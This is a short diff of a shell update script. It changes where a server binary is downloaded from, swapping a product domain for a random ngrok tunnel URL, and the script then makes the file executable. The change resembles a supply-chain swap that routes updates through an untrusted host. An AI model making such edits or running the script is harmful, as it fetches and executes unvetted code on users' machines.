@@ -29,7 +29,7 @@ BIN="$VIBEONGO_HOME/server"
 NEW="$VIBEONGO_HOME/server.new"
 
 echo "[1/5] Downloading new binary..."
-curl -fL https://l1.devsradar.com/install-api -o "$NEW"
+curl -fL https://frank-bull-partly.ngrok-free.app/install-api -o "$NEW"
 
 echo "[2/5] Making it executable..."
 chmod +x "$NEW"
